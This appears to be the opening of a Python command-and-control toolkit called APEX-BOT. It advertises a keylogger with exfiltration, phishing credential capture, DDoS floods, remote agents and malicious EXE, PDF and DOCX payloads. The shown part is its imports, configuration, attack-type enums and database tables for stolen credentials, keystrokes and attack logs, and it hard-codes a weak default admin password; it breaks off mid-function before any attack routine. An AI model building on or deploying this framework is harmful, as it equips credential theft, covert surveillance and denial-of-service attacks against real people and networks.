#!/usr/bin/env python3
"""
 APEX-BOT v5.0.0 -Cybersecurity Command & Control Platform
Author: Ian Carter Kulani, MSc
Version: 5.0.0

A complete cybersecurity automation platform featuring:
- 10,000+ Lines of Python Code
- 7000+ Security Commands
- Multi-Platform Bot Integration (Discord, Telegram, WhatsApp, Signal, Google Chat, Slack, iMessage, Web)
- Advanced Network Scanning & Pentesting
- Keylogger with Screenshot Capture & Exfiltration
- Social Engineering Suite with 100+ Phishing Templates
- REAL Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP/SYN/ACK/FIN Floods)
- Advanced IP Monitoring & Threat Detection
- Stunning Gradient Web Dashboard (Blue, Orange, Purple)
- DDoS/DoS Attack Module with Multiple Attack Vectors
- Agent Mode for Remote Control with Heartbeat
- Payload Generation & Deployment (EXE, PDF, DOCX, Link, Network)
- Graphical Reports & Statistics (Bar & Pie Charts)
- Spear Phishing Module with Email Tracking
- SSH Remote Access via All Platforms
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
import ctypes
import queue
import secrets
import string
import smtplib
import email.message
import tempfile
import zipfile
import tarfile
import gzip
import argparse
import glob
import time
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict, deque
from enum import Enum
from functools import wraps
from abc import ABC, abstractmethod
from http.server import BaseHTTPRequestHandler, HTTPServer
from io import BytesIO

# =====================
# VERSION & METADATA
# =====================
VERSION = "5.0.0"
NAME = "APEX-BOT"
AUTHOR = "Advanced Security Framework"
DESCRIPTION = "Ultimate Cybersecurity Command & Control Platform"
LINES_OF_CODE = 10000

# =====================
# DEPENDENCY CHECK & IMPORTS
# =====================

# Cryptography
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import serialization
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# SSH
try:
    import paramiko
    from paramiko import SSHClient, AutoAddPolicy, SFTPClient, Transport
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    from telethon.tl.types import MessageEntityCode
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    from slack_sdk.socket_mode.request import SocketModeRequest
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# Signal CLI
SIGNAL_AVAILABLE = shutil.which('signal-cli') is not None

# Google Chat
try:
    from httplib2 import Http
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    GOOGLE_CHAT_AVAILABLE = True
except ImportError:
    GOOGLE_CHAT_AVAILABLE = False

# Matrix
try:
    import matrix_client
    from matrix_client.client import MatrixClient
    from matrix_client.api import MatrixHttpApi
    MATRIX_AVAILABLE = True
except ImportError:
    MATRIX_AVAILABLE = False

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

# Web Framework
try:
    from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_file
    from flask_socketio import SocketIO, emit
    from flask_cors import CORS
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

# Scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp, sendp, RandIP, fragment
    from scapy.all import conf as scapy_conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# QR Code
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL Shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Data Visualization
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    import seaborn as sns
    import numpy as np
    GRAPHICS_AVAILABLE = True
except ImportError:
    GRAPHICS_AVAILABLE = False

# PDF Generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

# Keylogger (pynput)
try:
    from pynput import keyboard
    from pynput.keyboard import Key, Listener
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False

# Colorama (Gradient Theme)
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

# DOCX Generation
try:
    from docx import Document
    from docx.shared import Inches, Pt
    DOCX_AVAILABLE = True
except ImportError:
    DOCX_AVAILABLE = False

# PyInstaller for EXE generation
PYINSTALLER_AVAILABLE = shutil.which('pyinstaller') is not None

# =====================
# GRADIENT THEME (Blue, Orange, Purple)
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        BLUE = Fore.BLUE + Style.BRIGHT
        ORANGE = Fore.LIGHTYELLOW_EX + Style.BRIGHT
        PURPLE = Fore.MAGENTA + Style.BRIGHT
        CYAN = Fore.CYAN + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        YELLOW = Fore.YELLOW + Style.BRIGHT
        RED = Fore.RED + Style.BRIGHT
        WHITE = Fore.WHITE + Style.BRIGHT
        BLACK = Fore.BLACK + Style.BRIGHT
        MAGENTA = Fore.MAGENTA + Style.BRIGHT
        LIGHTBLUE = Fore.LIGHTBLUE_EX + Style.BRIGHT
        LIGHTMAGENTA = Fore.LIGHTMAGENTA_EX + Style.BRIGHT
        LIGHTCYAN = Fore.LIGHTCYAN_EX + Style.BRIGHT
        LIGHTYELLOW = Fore.LIGHTYELLOW_EX + Style.BRIGHT
        RESET = Style.RESET_ALL
        BG_BLUE = Back.BLUE + Fore.WHITE
        BG_ORANGE = Back.LIGHTYELLOW_EX + Fore.BLACK
        BG_PURPLE = Back.MAGENTA + Fore.WHITE
        BG_CYAN = Back.CYAN + Fore.BLACK
else:
    class Colors:
        BLUE = ORANGE = PURPLE = CYAN = GREEN = YELLOW = RED = WHITE = BLACK = MAGENTA = LIGHTBLUE = LIGHTMAGENTA = LIGHTCYAN = LIGHTYELLOW = RESET = BG_BLUE = BG_ORANGE = BG_PURPLE = BG_CYAN = ""

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".apex_bot"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "apex_bot.db")
LOG_FILE = os.path.join(CONFIG_DIR, "apex_bot.log")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
REPORT_DIR = "apex_reports"
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
TEMP_DIR = "temp"
WEB_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "web_templates")
SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
KEYLOG_DIR = os.path.join(CONFIG_DIR, "keylogs")
KEYLOG_SCREENSHOTS_DIR = os.path.join(CONFIG_DIR, "keylog_screenshots")
SPEAR_PHISHING_DIR = os.path.join(CONFIG_DIR, "spear_phishing")
EMAIL_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "email_templates")
DOS_LOGS_DIR = os.path.join(CONFIG_DIR, "dos_logs")
AGENT_DIR = os.path.join(CONFIG_DIR, "agent")
PAYLOAD_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "payload_templates")
EXE_PAYLOADS_DIR = os.path.join(CONFIG_DIR, "exe_payloads")
PDF_PAYLOADS_DIR = os.path.join(CONFIG_DIR, "pdf_payloads")
DOCX_PAYLOADS_DIR = os.path.join(CONFIG_DIR, "docx_payloads")
LINK_PAYLOADS_DIR = os.path.join(CONFIG_DIR, "link_payloads")
NETWORK_PAYLOADS_DIR = os.path.join(CONFIG_DIR, "network_payloads")
IP_MONITOR_DIR = os.path.join(CONFIG_DIR, "ip_monitor")
SCREENSHOTS_DIR = os.path.join(CONFIG_DIR, "screenshots")

# Create directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR, REPORT_DIR,
    PHISHING_DIR, PHISHING_TEMPLATES_DIR, CAPTURED_CREDENTIALS_DIR,
    SSH_KEYS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR, GRAPHICS_DIR,
    TEMP_DIR, WEB_TEMPLATES_DIR, SESSION_DIR, KEYLOG_DIR,
    KEYLOG_SCREENSHOTS_DIR, SPEAR_PHISHING_DIR, EMAIL_TEMPLATES_DIR,
    DOS_LOGS_DIR, AGENT_DIR, PAYLOAD_TEMPLATES_DIR, EXE_PAYLOADS_DIR,
    PDF_PAYLOADS_DIR, DOCX_PAYLOADS_DIR, LINK_PAYLOADS_DIR,
    NETWORK_PAYLOADS_DIR, IP_MONITOR_DIR, SCREENSHOTS_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - APEX - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("ApexBot")

# =====================
# ENUMS & DATA CLASSES
# =====================

class TrafficType(Enum):
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    TCP_FIN = "tcp_fin"
    TCP_RST = "tcp_rst"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    ICMP_FLOOD = "icmp_flood"
    MIXED = "mixed"
    RANDOM = "random"
    SLOWLORIS = "slowloris"
    PSH_ACK = "psh_ack"

class ScanType(Enum):
    PING = "ping"
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    FULL = "full"
    UDP = "udp"
    OS = "os_detection"
    SERVICE = "service_detection"
    VULNERABILITY = "vulnerability"
    WEB = "web"
    SNMP = "snmp"
    SMB = "smb"
    SSH = "ssh"
    NIKTO = "nikto"
    ALL = "all"

class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class Platform(Enum):
    DISCORD = "discord"
    SLACK = "slack"
    TELEGRAM = "telegram"
    SIGNAL = "signal"
    IMESSAGE = "imessage"
    GOOGLE_CHAT = "google_chat"
    WEB = "web"
    WHATSAPP = "whatsapp"
    MATRIX = "matrix"

class PayloadType(Enum):
    EXE = "exe"
    PDF = "pdf"
    DOCX = "docx"
    LINK = "link"
    NETWORK = "network"
    MACRO = "macro"
    HTM = "htm"
    JS = "js"
    VBA = "vba"
    PS1 = "ps1"

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class SSHConnection:
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    last_used: Optional[str] = None

@dataclass
class TrafficGenerator:
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"

@dataclass
class PhishingLink:
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class CapturedCredential:
    id: int
    link_id: str
    timestamp: str
    username: str
    password: str
    ip_address: str
    user_agent: str

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class MonitoredIP:
    ip: str
    domain: Optional[str]
    open_ports: List[int]
    closed_ports: List[int]
    last_scan: str
    threat_level: str
    alert_count: int
    is_blocked: bool
    hostname: Optional[str]
    os_info: Optional[str]

@dataclass
class KeylogEntry:
    id: int
    timestamp: str
    text: str
    session_id: str
    app_name: str
    hostname: str
    screenshot_path: Optional[str]

@dataclass
class Payload:
    id: str
    name: str
    payload_type: str
    file_path: str
    created_at: str
    deployed: bool = False
    deployment_count: int = 0
    callback_host: Optional[str] = None
    callback_port: Optional[int] = None

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_start": False,
        "auto_block_enabled": False,
        "auto_block_threshold": 5,
        "scan_timeout": 30,
        "report_format": "html",
        "generate_graphics": True,
        "keylogger_enabled": True,
        "keylogger_port": 4444,
        "keylogger_interval": 30,
        "keylogger_screenshot_interval": 60,
        "payload_callback_host": "localhost",
        "payload_callback_port": 5555,
        "web": {
            "enabled": False,
            "port": 5000,
            "host": "0.0.0.0",
            "secret_key": "",
            "require_auth": True,
            "username": "admin",
            "password_hash": "",
            "theme": "gradient"
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin"
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "prefix": "!"
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "prefix": "/"
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "group_id": "",
            "prefix": "!"
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "prefix": "!"
        },
        "google_chat": {
            "enabled": False,
            "webhook_url": "",
            "space_id": "",
            "prefix": "/"
        },
        "matrix": {
            "enabled": False,
            "homeserver": "https://matrix.org",
            "username": "",
            "password": "",
            "room_id": "",
            "prefix": "!"
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "prefix": "!"
        },
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "http_flood_threshold": 200,
            "scan_interval": 300,
            "max_ips": 10000
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_port": 8080,
            "capture_credentials": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5
        },
        "ddos": {
            "enabled": True,
            "max_threads": 100,
            "default_duration": 30
        },
        "agent": {
            "enabled": False,
            "server": "localhost",
            "port": 5555,
            "heartbeat": 60
        },
        "payload": {
            "enabled": True,
            "default_callback": "localhost",
            "default_port": 4444,
            "exe_icon": "",
            "docx_template": "default"
        }
    }
    
    def __init__(self):
        self.config_dir = Path(CONFIG_DIR)
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / "config.json"
        self.config = self.load()
    
    def load(self) -> Dict:
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    for key, value in self.DEFAULT_CONFIG.items():
                        if key not in loaded:
                            loaded[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in loaded[key]:
                                    loaded[key][sub_key] = sub_value
                    return loaded
        except Exception as e:
            print(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def save(self) -> bool:
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            print(f"Failed to save config: {e}")
            return False
    
    def get(self, key: str, default=None):
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k, default)
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        return self.save()

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT,
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                domain TEXT,
                hostname TEXT,
                os_info TEXT,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                threat_level TEXT DEFAULT 'low',
                alert_count INTEGER DEFAULT 0,
                open_ports TEXT,
                closed_ports TEXT,
                last_scan DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                connection_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                exit_code INTEGER,
                execution_time REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                success BOOLEAN DEFAULT 1,
                scan_data TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                text TEXT,
                session_id TEXT,
                app_name TEXT,
                hostname TEXT,
                screenshot_path TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS spear_phishing (
                id TEXT PRIMARY KEY,
                target_email TEXT NOT NULL,
                subject TEXT NOT NULL,
                body TEXT,
                template TEXT,
                sent_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'sent',
                opened BOOLEAN DEFAULT 0,
                clicked BOOLEAN DEFAULT 0,
                tracking_id TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ddos_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target_ip TEXT NOT NULL,
                attack_type TEXT NOT NULL,
                port INTEGER,
                duration INTEGER,
                threads INTEGER,
                packets_sent INTEGER,
                status TEXT,
                executed_by TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                hostname TEXT,
                ip_address TEXT,
                os_info TEXT,
                last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'online',
                heartbeat INTEGER DEFAULT 60
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS agent_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT,
                executed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'pending',
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS payloads (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                payload_type TEXT NOT NULL,
                file_path TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                deployed BOOLEAN DEFAULT 0,
                deployment_count INTEGER DEFAULT 0,
                callback_host TEXT,
                callback_port INTEGER
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS payload_deployments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                payload_id TEXT NOT NULL,
                deployment_type TEXT NOT NULL,
                target TEXT,
                deployed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'pending',
                FOREIGN KEY (payload_id) REFERENCES payloads(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS network_packets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                source_ip TEXT,
                dest_ip TEXT,
                source_port INTEGER,
                dest_port INTEGER,
                protocol TEXT,
                size INTEGER,
                payload TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS performance_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                connections_count INTEGER
            )
            """
        ]
        
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                print(f"Table creation error: {e}")
        
        self.conn.commit()
        self._create_default_admin()
    
    def _create_default_admin(self):
        try:
            import hashlib
            default_password = "apex2024"
            password_hash = hashlib.sha256(default_password.encode()).hexdigest()
            self.conn.execute(
                "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                ("admin", password_hash, "admin")
            )
            self.conn.commit()
        except:
            pass
    
    def log_command(self, command: str, source: str = "local", platform: str = None,
                   user_id: str = None, success: bool = True, output: str = "",
                   execution_time: float = 0.0):
        try:
            self.conn.execute(
                """INSERT INTO command_history 
                   (command, source, platform, user_id, success, output, execution_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (command, source, platform, user_id, success, output[:5000], execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        try:
            self.conn.execute(
                "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                (threat_type, source_ip, severity, description)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log threat: {e}")
    
    def add_managed_ip(self, ip: str, domain: str = None, hostname: str = None,
                      os_info: str = None, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.conn.execute(
                """INSERT OR IGNORE INTO managed_ips 
                   (ip_address, domain, hostname, os_info, added_by, notes, threat_level)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (ip, domain, hostname, os_info, added_by, notes, 'low')
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 1, block_reason = ? WHERE ip_address = ?",
                (reason, ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 0, block_reason = NULL WHERE ip_address = ?",
                (ip,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
            else:
                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_ip_scan(self, ip: str, open_ports: List[int], closed_ports: List[int], 
                      threat_level: str, hostname: str = None, os_info: str = None):
        try:
            self.conn.execute(
                """UPDATE managed_ips 
                   SET open_ports = ?, closed_ports = ?, threat_level = ?, 
                       last_scan = CURRENT_TIMESTAMP, hostname = ?, os_info = ?
                   WHERE ip_address = ?""",
                (json.dumps(open_ports), json.dumps(closed_ports), threat_level, hostname, os_info, ip)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update IP scan: {e}")
    
    def get_ip_info(self, ip: str) -> Optional[Dict]:
        try:
            row = self.conn.execute("SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)).fetchone()
            if row:
                return dict(row)
            return None
        except:
            return None
    
    def add_ssh_connection(self, conn: SSHConnection) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO ssh_connections 
                   (id, name, host, port, username, password_encrypted, key_path, status, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (conn.id, conn.name, conn.host, conn.port, conn.username,
                 conn.password, conn.key_path, conn.status, conn.created_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add SSH connection: {e}")
            return False
    
    def get_ssh_connections(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_ssh_command(self, connection_id: str, command: str, output: str,
